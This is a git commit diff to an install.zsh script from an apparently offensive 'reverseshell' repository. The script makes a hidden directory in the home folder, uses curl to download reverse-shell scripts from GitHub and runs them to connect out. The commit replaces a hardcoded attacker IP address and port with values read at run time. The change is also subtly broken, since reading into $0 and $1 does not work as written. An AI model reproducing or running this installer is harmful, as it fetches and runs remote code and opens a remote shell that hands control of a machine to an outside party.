b693f414c8f6e8ffc6af26fb815ad38cd8641507
mmilunicmobile <62996888+mmilunicmobile@users.noreply.github.com>
2022-02-13 20:39:31 -0500

    changed install

--- install.zsh
+++ install.zsh
@@ -1,6 +1,8 @@
+read 0
+read 1
 cd ~
 mkdir .reverse_shell_mmob
 cd .reverse_shell_mmob
 curl -o reverseshell.zsh https://raw.githubusercontent.com/mmilunicmobile/reverseshell/main/reverseshell.zsh
 curl -o start.zsh https://raw.githubusercontent.com/mmilunicmobile/reverseshell/main/start.zsh
-zsh start.zsh 71.173.141.166 9003
+zsh start.zsh $0 $1
